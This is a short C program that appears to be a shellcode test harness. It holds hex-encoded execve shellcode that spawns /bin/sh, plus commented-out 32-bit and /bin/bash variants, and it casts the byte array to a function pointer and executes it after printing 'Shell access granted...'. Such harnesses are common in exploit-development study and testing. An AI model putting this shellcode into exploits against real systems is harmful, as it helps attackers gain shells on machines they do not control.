#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//32 bit bin/sh shell code
//unsigned char code[] ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

//bin/sh -shellcode
unsigned char code[] ="\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


//bn/bash -shell code
//unsigned char code[] ="\xeb\x13\x5f\x48\x31\xc0\x88\x47\x09\x50\x57\x48\x89\xe6\x48\x89\xc2\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";

void main()
{
printf("\nShell access granted...\n");

int (*ret)()=(int(*)())code;
ret();
}